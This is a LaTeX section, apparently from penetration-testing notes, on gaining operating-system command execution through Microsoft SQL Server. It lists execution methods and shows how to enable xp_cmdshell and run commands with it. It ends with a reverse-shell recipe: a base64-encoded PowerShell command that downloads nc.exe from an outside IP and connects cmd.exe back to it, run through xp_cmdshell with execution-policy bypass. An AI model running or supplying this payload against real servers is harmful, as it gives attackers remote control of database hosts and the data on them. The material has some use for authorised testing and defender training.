\section{Command execution}


There are several methods to get command execution:
\begin{itemize}
    \item  \verb+xp_cmdshell+ 
    \item  adding
        \href{https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server}{extended
        stored procedures}, 
    \item
        \href{https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration}{CLR
        Assemblies}
    \item
        \href{https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15}{SQL Server Agent Jobs}
    \item
        \href{https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql}{external
        scripts}
\end{itemize}

With the appropriate privileges, SQL database can be used to execute system
commands or create the necessary elements to do it.

\subsection{xp\_cmdshell}
MSSQL has a
\href{https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15}{extended
stored procedures} called
\href{https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15}{xp\_cmdshell}
which allow us to execute system commands using SQL. \verb+xp_cmdshell+:
\begin{itemize}
        \item is a powerful feature and disabled by default. It can be enabled
            and disabled by using the
            \href{https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration}{Policy-Based
            Management} or by executing
            \href{https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option}{sp\_configure}
        \item spawn a  Windows process that  has the same security rights as the
            SQL Server service account
        \item  operates synchronously. Control is not returned to the caller until the command-shell command is completed
\end{itemize}

To Enable \verb+xp_cmdshell+ with \verb+sp_configure+
\begin{verbatim}
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.
RECONFIGURE
GO

-- To enable the feature.
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for this feature.
RECONFIGURE
GO
\end{verbatim}

to launch a command:
\begin{verbatim}
xp_cmdshell 'whoami'
GO
\end{verbatim}

\subsection{Reverse Shell}

\begin{verbatim}
python3 -c \
'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

exec xp_cmdshell 'powershell -exec bypass -enc BASE64_ENC
\end{verbatim}

